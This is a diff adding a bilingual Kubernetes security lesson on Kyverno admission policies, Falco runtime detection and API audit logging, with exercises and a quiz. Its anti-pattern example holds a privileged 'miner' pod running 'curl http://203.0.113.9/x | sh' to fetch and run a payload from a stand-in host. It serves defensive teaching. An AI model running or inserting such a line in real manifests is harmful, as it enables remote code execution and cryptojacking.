@@ -1,0 +1,373 @@
+description:
+  fr: "Faire respecter les politiques de sécurité à l'admission avec Kyverno et détecter les menaces à l'exécution avec Falco, complétés par l'audit logging."
+  en: "Enforce security policies at admission with Kyverno and detect threats at runtime with Falco, complemented by audit logging."
+duration: 25
+
+intro:
+  fr: |
+    Les leçons précédentes ont montré *comment* configurer un pod sûr. Mais comment **garantir** que chaque pod
+    déployé respecte ces règles, et comment **réagir** si quelque chose de malveillant se produit malgré tout ?
+    Deux moments clés : **l'admission** (avant que le pod n'existe) et **l'exécution** (pendant qu'il tourne).
+
+    L'analogie : le **contrôle d'admission** est le portique de sécurité à l'entrée de l'aéroport — il refuse les
+    objets interdits avant l'embarquement. La **détection à l'exécution** est la patrouille dans les terminaux —
+    elle repère les comportements suspects une fois les gens à l'intérieur. Les deux sont complémentaires :
+    l'un prévient, l'autre détecte.
+
+    Dans cette leçon, vous allez écrire une **ClusterPolicy Kyverno** qui interdit les pods privilégiés à
+    l'admission, écrire une **règle Falco** qui alerte quand un shell s'ouvre dans un conteneur en production, et
+    activer l'**audit logging** de l'API Server pour garder une trace de qui a fait quoi. C'est l'aboutissement
+    de la défense en profondeur dans Kubernetes.
+  en: |
+    The previous lessons showed *how* to configure a safe pod. But how do you **guarantee** that every deployed
+    pod follows these rules, and how do you **react** if something malicious happens anyway? Two key moments:
+    **admission** (before the pod exists) and **runtime** (while it runs).
+
+    The analogy: **admission control** is the airport security checkpoint — it refuses forbidden items before
+    boarding. **Runtime detection** is the patrol in the terminals — it spots suspicious behaviour once people
+    are inside. The two are complementary: one prevents, the other detects.
+
+    In this lesson you will write a **Kyverno ClusterPolicy** that blocks privileged pods at admission, write a
+    **Falco rule** that alerts when a shell is opened in a production container, and enable the API Server
+    **audit logging** to keep a trace of who did what. This is the culmination of defense in depth in Kubernetes.
+
+sections:
+  - heading:
+      fr: "Contrôle d'admission avec Kyverno"
+      en: "Admission control with Kyverno"
+    body:
+      fr: |
+        Un **webhook d'admission** est appelé par l'API Server à chaque création/modification d'objet, *avant*
+        qu'il soit persisté. Il peut **valider** (accepter/rejeter) ou **muter** (modifier) l'objet. C'est
+        l'endroit idéal pour imposer des règles de sécurité sur tout le cluster.
+
+        **Kyverno** est un moteur de politiques pensé pour Kubernetes : les politiques s'écrivent en **YAML**, pas
+        dans un langage dédié, ce qui le rend très accessible (à la différence d'OPA/Gatekeeper qui utilise Rego).
+
+        | Type de règle | Effet |
+        |---|---|
+        | `validate` | Rejette l'objet non conforme (ou l'audite) |
+        | `mutate` | Ajoute/modifie des champs (ex. injecter un securityContext) |
+        | `generate` | Crée des objets associés (ex. une NetworkPolicy par namespace) |
+
+        Une politique a un `validationFailureAction` : `Enforce` (bloque) ou `Audit` (journalise seulement). Comme
+        toujours, on déploie d'abord en `Audit`, on observe les violations, puis on passe en `Enforce`.
+      en: |
+        An **admission webhook** is called by the API Server on every object creation/modification, *before* it
+        is persisted. It can **validate** (accept/reject) or **mutate** (modify) the object. It is the ideal place
+        to enforce security rules across the whole cluster.
+
+        **Kyverno** is a policy engine built for Kubernetes: policies are written in **YAML**, not a dedicated
+        language, which makes it very approachable (unlike OPA/Gatekeeper, which uses Rego).
+
+        | Rule type | Effect |
+        |---|---|
+        | `validate` | Rejects the non-compliant object (or audits it) |
+        | `mutate` | Adds/changes fields (e.g. inject a securityContext) |
+        | `generate` | Creates associated objects (e.g. a NetworkPolicy per namespace) |
+
+        A policy has a `validationFailureAction`: `Enforce` (blocks) or `Audit` (logs only). As always, you deploy
+        first in `Audit`, observe violations, then switch to `Enforce`.
+  - heading:
+      fr: "Détection à l'exécution avec Falco"
+      en: "Runtime detection with Falco"
+    body:
+      fr: |
+        Le contrôle d'admission ne voit que la *configuration*. Il ne détecte pas qu'un conteneur, une fois
+        lancé, se met à faire quelque chose d'anormal : ouvrir un shell, lire `/etc/shadow`, lancer une connexion
+        sortante inattendue. C'est le rôle de **Falco**, le détecteur d'intrusion à l'exécution de référence (un
+        projet de la CNCF).
+
+        Falco observe les **appels système** du noyau (via eBPF) et les compare à un jeu de **règles**. Quand un
+        comportement correspond à une règle, il émet une alerte. Exemples de ce qu'on détecte :
+
+        - un **shell interactif** ouvert dans un conteneur (`bash`, `sh`) — souvent le signe d'une intrusion ;
+        - l'écriture dans un **répertoire sensible** (`/etc`, `/bin`) ;
+        - une **connexion sortante** vers une IP suspecte ;
+        - la lecture de fichiers de **credentials**.
+
+        Une règle Falco combine une `condition` (quels syscalls), une `output` (le message d'alerte) et une
+        `priority`. Falco ne bloque pas par défaut : il **alerte**, et on branche la réponse (notification, kill
+        du pod) en aval.
+      en: |
+        Admission control only sees the *configuration*. It does not detect that a container, once running, starts
+        doing something abnormal: opening a shell, reading `/etc/shadow`, making an unexpected outbound connection.
+        That is the job of **Falco**, the reference runtime intrusion detector (a CNCF project).
+
+        Falco observes the kernel's **system calls** (via eBPF) and compares them to a set of **rules**. When a
+        behaviour matches a rule, it emits an alert. Examples of what you detect:
+
+        - an **interactive shell** opened in a container (`bash`, `sh`) — often a sign of intrusion;
+        - a write to a **sensitive directory** (`/etc`, `/bin`);
+        - an **outbound connection** to a suspicious IP;
+        - reading **credential** files.
+
+        A Falco rule combines a `condition` (which syscalls), an `output` (the alert message) and a `priority`.
+        Falco does not block by default: it **alerts**, and you wire the response (notification, kill the pod)
+        downstream.
+
+examples:
+  - title:
+      fr: "Dangereux : rien ne vérifie les pods déployés"
+      en: "Dangerous: nothing checks the deployed pods"
+    file: no-guardrails.yaml
+    lang: yaml
+    kind: vulnerable
+    code: |
+      # ANTI-PATTERN - a cluster with no admission control and no runtime
+      # detection. This manifest deploys freely because nothing stops it.
+      apiVersion: v1
+      kind: Pod
+      metadata:
+        name: miner
+        namespace: production
+      spec:
+        containers:
+          - name: miner
+            image: unknown-registry.example.com/crypto:latest
+            securityContext:
+              privileged: true     # accepted: no policy forbids it
+            command: ["/bin/sh", "-c", "curl http://203.0.113.9/x | sh"]
+      # - Admission control: none -> the privileged pod is created.
+      # - Runtime detection: none -> the `curl | sh` goes unnoticed.
+    output: |
+      # kubectl apply -f no-guardrails.yaml
+      pod/miner created        <-- privileged crypto-miner runs unchallenged
+      # No alert is raised when it opens a shell and pulls a payload.
+    note:
+      fr: "Sans contrôle d'admission, ce pod privilégié est accepté ; sans Falco, son comportement malveillant (`curl | sh`) passe inaperçu. Les deux couches manquent : ni prévention, ni détection."
+      en: "Without admission control, this privileged pod is accepted; without Falco, its malicious behaviour (`curl | sh`) goes unnoticed. Both layers are missing: neither prevention nor detection."
+
+  - title:
+      fr: "Sécurisé : ClusterPolicy Kyverno anti-privilège"
+      en: "Secure: anti-privilege Kyverno ClusterPolicy"
+    file: disallow-privileged.yaml
+    lang: yaml
+    kind: secure
+    code: |
+      apiVersion: kyverno.io/v1
+      kind: ClusterPolicy
+      metadata:
+        name: disallow-privileged-containers
+      spec:
+        # Enforce = reject. Use Audit first to observe without blocking.
+        validationFailureAction: Enforce
+        background: true
+        rules:
+          - name: privileged-containers
+            match:
+              any:
+                - resources:
+                    kinds: [Pod]
+            validate:
+              message: "Privileged containers are not allowed."
+              pattern:
+                spec:
+                  # =(...) means "if present, must equal"; ensures no
+                  # container sets privileged: true.
+                  =(containers):
+                    - =(securityContext):
+                        =(privileged): "false"
+    output: |
+      # Trying to create the privileged `miner` pod now fails at admission:
+      # Error from server: admission webhook "validate.kyverno.svc-fail"
+      #   denied the request:
+      #   disallow-privileged-containers: Privileged containers are not allowed.
+    note:
+      fr: "Kyverno rejette le pod **avant** sa création : le conteneur privilégié n'existe jamais. La politique est en YAML pur, lisible sans apprendre un langage dédié. On commence en `Audit`, puis on bascule en `Enforce`."
+      en: "Kyverno rejects the pod **before** creation: the privileged container never exists. The policy is pure YAML, readable without learning a dedicated language. You start in `Audit`, then switch to `Enforce`."
+
+  - title:
+      fr: "Sécurisé : règle Falco (shell dans un conteneur)"
+      en: "Secure: Falco rule (shell in a container)"
+    file: falco-rules.yaml
+    lang: yaml
+    kind: secure
+    code: |
+      # /etc/falco/rules.d/custom.yaml - loaded by the Falco daemon.
+      - rule: Terminal shell in production container
+        desc: >
+          Detect an interactive shell spawned inside a container in the
+          production namespace - a strong indicator of hands-on intrusion.
+        condition: >
+          spawned_process
+          and container
+          and shell_procs
+          and proc.tty != 0
+          and k8s.ns.name = "production"
+        output: >
+          Shell opened in production container
+          (user=%user.name container=%container.name
+           image=%container.image.repository command=%proc.cmdline
+           pod=%k8s.pod.name)
+        priority: WARNING
+        tags: [container, shell, mitre_execution]
+    output: |
+      # Falco alert written to stdout / forwarded to a SIEM:
+      13:42:07.1 Warning Shell opened in production container
+        (user=root container=api image=registry.example.com/api
+         command=bash pod=api-7c9d)
+    note:
+      fr: "La règle se déclenche quand un shell interactif (`shell_procs`, `proc.tty != 0`) démarre dans un conteneur du namespace `production`. Falco **alerte** en temps réel ; on branche ensuite une réponse (notification Slack, kill du pod)."
+      en: "The rule fires when an interactive shell (`shell_procs`, `proc.tty != 0`) starts in a `production` namespace container. Falco **alerts** in real time; you then wire a response (Slack notification, kill the pod)."
+
+  - title:
+      fr: "Audit logging de l'API Server"
+      en: "API Server audit logging"
+    file: audit-policy.yaml
+    lang: yaml
+    kind: secure
+    code: |
+      # /etc/kubernetes/audit/policy.yaml
+      # Enable via API Server flags:
+      #   --audit-policy-file=/etc/kubernetes/audit/policy.yaml
+      #   --audit-log-path=/var/log/kubernetes/audit.log
+      apiVersion: audit.k8s.io/v1
+      kind: Policy
+      rules:
+        # Record full request+response bodies for secret access: the most
+        # sensitive operation to be able to investigate later.
+        - level: RequestResponse
+          resources:
+            - group: ""
+              resources: ["secrets", "configmaps"]
+        # Record metadata for all write operations (create/update/delete).
+        - level: Metadata
+          verbs: ["create", "update", "patch", "delete"]
+        # Do not log noisy, low-value read-only requests on events.
+        - level: None
+          resources:
+            - group: ""
+              resources: ["events"]
+    output: |
+      # One audit entry (JSON, trimmed) when someone reads a secret:
+      {"verb":"get","user":{"username":"dev-bob"},
+       "objectRef":{"resource":"secrets","name":"db-credentials",
+       "namespace":"shop"},"responseStatus":{"code":200}}
+    note:
+      fr: "L'audit logging garde une trace horodatée de *qui* a lu *quel* secret et *quand*. En cas d'incident, c'est la source qui permet de reconstituer les actions de l'attaquant. On journalise finement les secrets, et en métadonnées les écritures."
+      en: "Audit logging keeps a timestamped trace of *who* read *which* secret and *when*. During an incident, it is the source that lets you reconstruct the attacker's actions. You log secrets in detail, and writes at metadata level."
+
+mistake:
+  fr: |
+    **Croire que le contrôle d'admission suffit.** Kyverno empêche un pod privilégié *d'être créé*, mais il ne
+    voit rien de ce qui se passe *ensuite* : un conteneur parfaitement conforme à l'admission peut être compromis
+    à l'exécution et se mettre à ouvrir un shell ou exfiltrer des données. Il faut **les deux** couches —
+    admission (prévention) **et** runtime (détection). Autre erreur : déployer Kyverno directement en `Enforce`
+    sur un cluster existant, ce qui bloque brutalement des déploiements légitimes non préparés. On commence
+    toujours en `Audit`.
+  en: |
+    **Believing admission control is enough.** Kyverno stops a privileged pod *from being created*, but it sees
+    nothing of what happens *afterward*: a container perfectly compliant at admission can be compromised at
+    runtime and start opening a shell or exfiltrating data. You need **both** layers — admission (prevention)
+    **and** runtime (detection). Another mistake: deploying Kyverno straight in `Enforce` on an existing cluster,
+    which abruptly blocks legitimate, unprepared deployments. Always start in `Audit`.
+
+bestPractice:
+  fr: |
+    - **Combinez prévention et détection** : Kyverno (admission) ET Falco (runtime), jamais l'un sans l'autre.
+    - **Déployez les politiques en `Audit` d'abord**, observez, puis passez en `Enforce`.
+    - **Écrivez des politiques ciblées** : interdire `privileged`, imposer non-root, exiger des images signées.
+    - **Branchez les alertes Falco** vers un SIEM et définissez une réponse (notification, isolation du pod).
+    - **Activez l'audit logging** de l'API Server, surtout sur l'accès aux secrets, pour l'investigation post-incident.
+  en: |
+    - **Combine prevention and detection**: Kyverno (admission) AND Falco (runtime), never one without the other.
+    - **Deploy policies in `Audit` first**, observe, then switch to `Enforce`.
+    - **Write targeted policies**: forbid `privileged`, require non-root, require signed images.
+    - **Wire Falco alerts** to a SIEM and define a response (notification, pod isolation).
+    - **Enable API Server audit logging**, especially on secret access, for post-incident investigation.
+
+exercise:
+  statement:
+    fr: |
+      Votre équipe veut **interdire les images taguées `latest`** dans tout le cluster, car elles empêchent de
+      savoir quelle version tourne réellement (risque d'intégrité).
+
+      Écrivez une **ClusterPolicy Kyverno** en mode `Enforce` qui rejette tout Pod dont une image se termine par
+      `:latest`. Indiquez aussi comment la tester sans bloquer avant de l'activer.
+    en: |
+      Your team wants to **forbid `latest`-tagged images** across the whole cluster, because they make it
+      impossible to know which version actually runs (integrity risk).
+
+      Write a Kyverno **ClusterPolicy** in `Enforce` mode that rejects any Pod whose image ends with `:latest`.
+      Also state how to test it without blocking before enabling it.
+  solution:
+    file: solution.yaml
+    lang: yaml
+    code: |
+      apiVersion: kyverno.io/v1
+      kind: ClusterPolicy
+      metadata:
+        name: disallow-latest-tag
+      spec:
+        # To test first, set this to Audit, observe violations, then Enforce.
+        validationFailureAction: Enforce
+        background: true
+        rules:
+          - name: require-image-tag
+            match:
+              any:
+                - resources:
+                    kinds: [Pod]
+            validate:
+              message: "Using the ':latest' tag is not allowed; pin a version."
+              pattern:
+                spec:
+                  containers:
+                    # Image must NOT end with :latest (and must have a tag).
+                    - image: "!*:latest"
+    note:
+      fr: "Le motif `!*:latest` rejette toute image se terminant par `:latest`. Pour tester sans risque, on met `validationFailureAction: Audit`, on relève les violations (`kubectl get policyreport -A`), puis on bascule en `Enforce`."
+      en: "The `!*:latest` pattern rejects any image ending in `:latest`. To test safely, set `validationFailureAction: Audit`, collect violations (`kubectl get policyreport -A`), then switch to `Enforce`."
+
+quiz:
+  - q:
+      fr: "Quand intervient un webhook de contrôle d'admission ?"
+      en: "When does an admission control webhook act?"
+    options:
+      fr: ["Après l'arrêt du pod", "Avant que l'objet ne soit persisté dans le cluster", "Une fois par jour", "Seulement au démarrage du cluster"]
+      en: ["After the pod stops", "Before the object is persisted in the cluster", "Once a day", "Only at cluster startup"]
+    answer: 1
+    why:
+      fr: "Le webhook est appelé par l'API Server à chaque création/modification, avant la persistance : il peut donc rejeter ou modifier l'objet en amont."
+      en: "The webhook is called by the API Server on each creation/modification, before persistence: it can therefore reject or modify the object upfront."
+  - q:
+      fr: "Dans quel langage s'écrivent les politiques Kyverno ?"
+      en: "In what language are Kyverno policies written?"
+    options:
+      fr: ["En Rego", "En Python", "En YAML", "En Go"]
+      en: ["In Rego", "In Python", "In YAML", "In Go"]
+    answer: 2
+    why:
+      fr: "Kyverno utilise du YAML natif Kubernetes, ce qui le rend plus accessible qu'OPA/Gatekeeper qui exige le langage Rego."
+      en: "Kyverno uses native Kubernetes YAML, which makes it more approachable than OPA/Gatekeeper, which requires the Rego language."
+  - q:
+      fr: "Que détecte Falco ?"
+      en: "What does Falco detect?"
+    options:
+      fr: ["Des comportements anormaux à l'exécution via les appels système", "Les erreurs de syntaxe YAML", "Les certificats expirés", "Les coûts cloud"]
+      en: ["Abnormal runtime behaviour via system calls", "YAML syntax errors", "Expired certificates", "Cloud costs"]
+    answer: 0
+    why:
+      fr: "Falco observe les syscalls du noyau (eBPF) et alerte sur les comportements suspects : shell ouvert, lecture de credentials, connexion sortante inattendue."
+      en: "Falco observes kernel syscalls (eBPF) and alerts on suspicious behaviour: a shell opened, credential reads, unexpected outbound connections."
+  - q:
+      fr: "Pourquoi faut-il à la fois un contrôle d'admission ET une détection à l'exécution ?"
+      en: "Why do you need both admission control AND runtime detection?"
+    options:
+      fr: ["Pour doubler les logs", "L'admission prévient à la création, le runtime détecte un pod conforme mais compromis ensuite", "Parce que l'un remplace l'autre", "Pour réduire les coûts"]
+      en: ["To double the logs", "Admission prevents at creation, runtime detects a compliant pod compromised later", "Because one replaces the other", "To reduce costs"]
+    answer: 1
+    why:
+      fr: "L'admission ne voit que la configuration initiale ; un conteneur conforme peut être compromis à l'exécution, ce que seul Falco détecte. Les deux couches sont complémentaires."
+      en: "Admission only sees the initial configuration; a compliant container can be compromised at runtime, which only Falco detects. The two layers are complementary."
+  - q:
+      fr: "Quel est l'intérêt principal de l'audit logging de l'API Server ?"
+      en: "What is the main benefit of API Server audit logging?"
+    options:
+      fr: ["Accélérer les requêtes", "Chiffrer les secrets", "Compiler les images", "Garder une trace de qui a fait quoi, pour l'investigation"]
+      en: ["Speed up requests", "Encrypt secrets", "Build images", "Keep a trace of who did what, for investigation"]
+    answer: 3
+    why:
+      fr: "L'audit logging enregistre les actions (qui a lu quel secret, quand) ; en cas d'incident, il permet de reconstituer les agissements de l'attaquant."
+      en: "Audit logging records actions (who read which secret, when); during an incident, it lets you reconstruct the attacker's activity."
